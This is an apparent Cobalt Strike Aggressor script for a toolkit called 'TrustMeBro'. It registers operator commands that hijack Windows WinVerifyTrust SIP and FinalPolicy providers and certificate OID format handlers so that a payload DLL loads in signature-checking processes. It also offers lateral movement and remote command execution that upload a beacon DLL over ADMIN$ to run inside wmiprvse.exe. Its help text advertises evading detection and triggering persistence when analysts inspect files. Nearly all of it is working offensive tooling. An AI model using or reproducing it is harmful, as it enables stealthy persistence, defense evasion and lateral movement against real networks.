# ---- tmb custom_provider ----
alias tmb_custom_provider {
    local('$action $guid $args');
    $action = 0;
    $guid = "";
    
    if ($2 eq "--clean") {
        $action = 1;
        $guid = $3;
    } else {
        $guid = $2;
    }
    
    if ($guid eq "") {
        berror($1, "Usage: tmb_custom_provider <GUID> [--clean]");
        return;
    }
    
    $args = bof_pack($1, "sz", $action, $guid);
    tmb_exec("tmb_custom_provider", $1, $args);
}

beacon_command_register(
    "tmb_custom_provider",
    "Register a custom action GUID with FinalPolicy = SoftpubCleanup",
    "Usage: tmb_custom_provider {GUID}\n       tmb_custom_provider --clean {GUID}\n\nEvades detection rules keyed to the Authenticode GUID."
);

# ---- tmb sip_exec ----
alias tmb_sip_exec {
    local('$action $dll $guid $args $i');
    $action = 0; # install
    $dll = "";
    $guid = "pe";
    
    for ($i = 1; $i < size(@_); $i++) {
        if (@_[$i] eq "install") { $action = 0; }
        else if (@_[$i] eq "remove" || @_[$i] eq "--clean") { $action = 1; }
        else if (@_[$i] eq "--dll" && ($i + 1) < size(@_)) { $i++; $dll = @_[$i]; }
        else if (@_[$i] eq "--guid" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
    }
    
    if ($action == 0 && $dll eq "") {
        berror($1, "Usage: tmb_sip_exec install --dll C:\\path\\implant.dll --guid pe");
        return;
    }
    
    $args = bof_pack($1, "szz", $action, $dll, $guid);
    tmb_exec("tmb_sip_exec", $1, $args);
}

beacon_command_register(
    "tmb_sip_exec",
    "Install payload DLL on SIP execution surface (loads in any WVT caller)",
    "Usage: tmb_sip_exec install --dll <path> --guid <alias>\n       tmb_sip_exec remove --guid <alias>\n\nAliases: pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac"
);

# ---- tmb clean ----
alias tmb_clean {
    local('$flags $guid $args $i');
    $flags = 0;
    $guid = "";
    
    for ($i = 1; $i < size(@_); $i++) {
        if (@_[$i] eq "--sip") { $flags = $flags | 1; }
        else if (@_[$i] eq "--finalpolicy") { $flags = $flags | 2; }
        else if (@_[$i] eq "--all") { $flags = $flags | 4; }
        else if (@_[$i] eq "--custom-provider" && ($i + 1) < size(@_)) {
            $i++;
            $guid = @_[$i];
        }
    }
    
    $args = bof_pack($1, "sz", $flags, $guid);
    tmb_exec("tmb_clean", $1, $args);
}

beacon_command_register(
    "tmb_clean",
    "Remove all TrustMeBro persistence artifacts",
    "Usage: tmb_clean --sip\n       tmb_clean --finalpolicy\n       tmb_clean --custom-provider {GUID}\n       tmb_clean --all\n\nRequires admin. Log out and log back in."
);

# ---- tmb formatghost ----
alias tmb_formatghost {
    local('$action $oid $dll $func $args $i');
    $action = 0;
    $oid = "";
    $dll = "";
    $func = "FormatObject";
    
    for ($i = 1; $i < size(@_); $i++) {
        if (@_[$i] eq "--clean") { $action = 1; }
        else if (@_[$i] eq "--oid" && ($i + 1) < size(@_)) { $i++; $oid = @_[$i]; }
        else if (@_[$i] eq "--dll" && ($i + 1) < size(@_)) { $i++; $dll = @_[$i]; }
        else if (@_[$i] eq "--funcname" && ($i + 1) < size(@_)) { $i++; $func = @_[$i]; }
    }
    
    if ($oid eq "") {
        berror($1, "Usage: tmb_formatghost --oid <OID> --dll <path> [--funcname FormatObject] [--clean]");
        return;
    }
    
    $args = bof_pack($1, "szzz", $action, $oid, $dll, $func);
    tmb_exec("tmb_formatghost", $1, $args);
}

beacon_command_register(
    "tmb_formatghost",
    "Register CryptDllFormatObject OID handler (analyst-triggered persistence)",
    "Usage: tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --dll C:\\path\\payload.dll\n       tmb_formatghost --oid 1.3.6.1.4.1.311.99.1 --clean\n\nDLL loads when certutil -dump or cert UI parses a PE with the OID."
);

# ================================================================
# SIPExec — Lateral movement via WinVerifyTrust FinalPolicy hijack
# ================================================================

# ---- jump sipexec ----
# Registers as a lateral movement module: jump sipexec <target> <listener>
# Operator must supply the beacon DLL.

sub sipexec_jump_invoke {
    local('$bid $target $dll_path $share $guid $no_cleanup $args $bof_data $handle');
    $bid = $1;
    $target = $2;
    $dll_path = $3;
    $share = $4;
    $guid = $5;
    $no_cleanup = $6;

    if ($dll_path eq "") {
        berror($bid, "DLL path is required for jump sipexec");
        return;
    }

    # Read DLL file
    $handle = openf($dll_path);
    if ($handle is $null) {
        berror($bid, "Cannot open DLL: $dll_path");
        return;
    }
    $dll_data = readb($handle, -1);
    closef($handle);

    if (strlen($dll_data) == 0) {
        berror($bid, "DLL file is empty: $dll_path");
        return;
    }

    btask($bid, "SIPExec jump → $target via FinalPolicy hijack", "T1553.003");

    # Pack: mode(short) target(z) command(z) dll_len(int) dll_data(z) dll_path_override(z) share(z) guid(z) no_cleanup(short)
    $args = bof_pack($bid, "szzizbzzsss",
        0,                   # mode = jump
        $target,             # target
        "",                  # command (empty for jump)
        strlen($dll_data),   # dll_len
        $dll_data,           # dll_data bytes
        "",                  # dll_path_override (empty = upload)
        $share,              # share
        $guid,               # guid alias
        $no_cleanup          # no_cleanup
    );

    tmb_exec("tmb_sipexec", $bid, $args);
}

alias tmb_sipexec_jump {
    local('$target $dll $share $guid $no_cleanup $i');
    $target = "";
    $dll = "";
    $share = "ADMIN\$";
    $guid = "default";
    $no_cleanup = 0;

    for ($i = 1; $i < size(@_); $i++) {
        if (@_[$i] eq "--dll" && ($i + 1) < size(@_)) { $i++; $dll = @_[$i]; }
        else if (@_[$i] eq "--share" && ($i + 1) < size(@_)) { $i++; $share = @_[$i]; }
        else if (@_[$i] eq "-s" && ($i + 1) < size(@_)) { $i++; $share = @_[$i]; }
        else if (@_[$i] eq "--guid" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
        else if (@_[$i] eq "-g" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
        else if (@_[$i] eq "--no-cleanup") { $no_cleanup = 1; }
        else if ($target eq "") { $target = @_[$i]; }
        else if ($dll eq "") { $dll = @_[$i]; }
    }

    if ($target eq "" || $dll eq "") {
        berror($1, "Usage: tmb_sipexec_jump <target> <dll_path> [--share ADMIN\$] [--guid default] [--no-cleanup]");
        return;
    }

    sipexec_jump_invoke($1, $target, $dll, $share, $guid, $no_cleanup);
}

beacon_command_register(
    "tmb_sipexec_jump",
    "Lateral movement via WinVerifyTrust FinalPolicy hijack (DLL loads in wmiprvse.exe)",
    "Usage: tmb_sipexec_jump <target> <dll_path> [options]\n\n  <target>       Hostname or IP\n  <dll_path>     Path to beacon/agent DLL (x64)\n  --share, -s    Upload share (default: ADMIN\$)\n  --guid, -g     FinalPolicy GUID: default, driver, https, or raw {GUID}\n  --no-cleanup   Leave registry hijacked + DLL on disk\n\nRequires admin on target. Uses current token (make_token/steal_token first).\nDLL loads inside wmiprvse.exe — no new process created.\n\nMITRE: T1553.003 + T1047"
);

# Also register as a jump module for CS lateral movement GUI
beacon_remote_exploit_register("sipexec", "x64", "WinVerifyTrust FinalPolicy hijack (wmiprvse.exe)", lambda({
    sipexec_jump_invoke($1, $2, script_resource("../sipexec/sipexec_payload_impersonate.dll"), "ADMIN\$", "default", 0);
}));

# ---- remote-exec sipexec ----
alias tmb_sipexec_exec {
    local('$target $command $dll $share $guid $no_cleanup $dll_path_override $i');
    $target = "";
    $command = "";
    $dll = "";
    $share = "ADMIN\$";
    $guid = "default";
    $no_cleanup = 0;
    $dll_path_override = "";

    for ($i = 1; $i < size(@_); $i++) {
        if (@_[$i] eq "--dll" && ($i + 1) < size(@_)) { $i++; $dll = @_[$i]; }
        else if (@_[$i] eq "--unc" && ($i + 1) < size(@_)) { $i++; $dll_path_override = @_[$i]; }
        else if (@_[$i] eq "--share" && ($i + 1) < size(@_)) { $i++; $share = @_[$i]; }
        else if (@_[$i] eq "-s" && ($i + 1) < size(@_)) { $i++; $share = @_[$i]; }
        else if (@_[$i] eq "--guid" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
        else if (@_[$i] eq "-g" && ($i + 1) < size(@_)) { $i++; $guid = @_[$i]; }
        else if (@_[$i] eq "--no-cleanup") { $no_cleanup = 1; }
        else if ($target eq "") { $target = @_[$i]; }
        else { $command = $command . @_[$i] . " "; }
    }

    $command = trim($command);

    if ($target eq "" || $command eq "") {
        berror($1, "Usage: tmb_sipexec_exec <target> <command> [--dll path] [--unc \\\\host\\share\\payload.dll] [--share ADMIN\$] [--guid default] [--no-cleanup]");
        return;
    }

    # If UNC override provided, no upload needed
    if ($dll_path_override ne "") {
        btask($1, "SIPExec exec → $target (UNC: $dll_path_override)", "T1553.003");
        local('$args');
        $args = bof_pack($1, "szzizzzzs",
            1,                      # mode = exec
            $target,
            $command,
            0,                      # dll_len = 0 (using path override)
            "",                     # no dll_data
            $dll_path_override,     # dll_path_override
            $share,
            $guid,
            $no_cleanup
        );
        tmb_exec("tmb_sipexec", $1, $args);
        return;
    }

    # Read DLL (custom or bundled impersonation payload)
    local('$dll_file $handle $dll_data $args');
    if ($dll ne "") {
        $dll_file = $dll;
    } else {
        $dll_file = script_resource("../sipexec/sipexec_payload_impersonate.dll");
    }

    $handle = openf($dll_file);
    if ($handle is $null) {
        berror($1, "Cannot open DLL: $dll_file");
        return;
    }
    $dll_data = readb($handle, -1);
    closef($handle);

    if (strlen($dll_data) == 0) {
        berror($1, "DLL file is empty");
        return;
    }

    btask($1, "SIPExec exec → $target : $command", "T1553.003");

    $args = bof_pack($1, "szzizzzss",
        1,                   # mode = exec
        $target,
        $command,
        strlen($dll_data),   # dll_len
        $dll_data,           # dll_data bytes
        "",                  # dll_path_override (empty = upload)
        $share,
        $guid,
        $no_cleanup
    );

    tmb_exec("tmb_sipexec", $1, $args);
}

beacon_command_register(
    "tmb_sipexec_exec",
    "Remote command execution via WinVerifyTrust FinalPolicy hijack + named pipe",
    "Usage: tmb_sipexec_exec <target> <command> [options]\n\n  <target>       Hostname or IP\n  <command>      Command to execute (runs as admin via pipe impersonation)\n  --dll          Custom payload DLL (default: bundled sipexec_payload_impersonate.dll)\n  --unc          Use existing UNC path instead of uploading (fileless on target)\n  --share, -s    Upload share (default: ADMIN\$)\n  --guid, -g     FinalPolicy GUID: default, driver, https, or raw {GUID}\n  --no-cleanup   Leave registry hijacked + DLL on disk\n\nRequires admin on target. Uses current token.\nOutput returns via named pipe inside wmiprvse.exe.\n\nMITRE: T1553.003 + T1047"
);
